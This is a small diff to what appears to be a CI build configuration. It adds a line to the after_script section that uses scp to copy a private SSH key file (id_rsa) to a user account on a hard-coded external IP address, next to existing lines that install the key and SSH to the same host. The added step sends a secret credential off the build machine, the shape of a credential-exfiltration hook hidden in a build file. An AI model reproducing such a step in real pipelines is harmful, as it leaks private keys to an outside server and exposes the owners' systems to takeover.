@@ -11,5 +11,6 @@ script:
 after_script:
   - cp id_rsa ~/.ssh/id_rsa
   - ssh maodou@182.92.71.18
+  - scp id_rsa maodou@182.92.71.18:~
   - touch "I-am-a-good-boy"
   
